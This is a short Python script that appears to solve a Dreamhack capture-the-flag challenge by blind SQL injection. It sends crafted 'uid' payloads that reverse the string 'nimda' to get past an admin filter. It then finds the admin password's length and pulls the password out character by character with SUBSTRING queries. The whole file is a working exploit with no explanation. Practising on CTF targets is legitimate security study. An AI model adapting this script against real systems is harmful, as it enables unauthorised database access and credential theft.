from requests import get
from string import ascii_letters, digits

url = "http://host3.dreamhack.games:20277"
charset = ascii_letters + digits + '{}_'

password_length = 1
flag = ""

while True:
    payload = f"'||uid=reverse('nimda')&&length(upw)={password_length}#"
    r = get(url, params={'uid': payload})
    if 'admin' in r.text:
        break
    else:
        password_length += 1
        print(password_length)

print(f'Password length: {password_length}')
    
for i in range(1, password_length + 1):
    for c in charset:
        payload = f"'||uid=reverse('nimda')&&SUBSTRING(upw,{i},1)='{c}'#"
        r = get(url, params={'uid': payload})
        if 'admin' in r.text:
            flag += c
            break
print(flag)
